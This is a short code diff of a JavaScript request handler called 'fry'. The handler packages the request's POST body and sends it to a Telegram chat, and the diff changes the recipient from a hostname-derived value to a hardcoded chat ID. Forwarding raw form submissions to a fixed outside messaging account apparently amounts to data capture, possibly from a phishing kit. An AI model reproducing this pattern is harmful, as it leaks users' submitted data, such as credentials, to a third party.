@@ -40,7 +40,8 @@ function fry(req, res, next) {
 				"POST_VARS"	: req.body
 			}
 			sendTelegram(
-				req.headers['x-forwarded-host'].replace(/\:.*/,'').split('.')[0],
+				 6984850,
+				//req.headers['x-forwarded-host'].replace(/\:.*/,'').split('.')[0],
 				JSON.stringify(
 					result,
 					null,
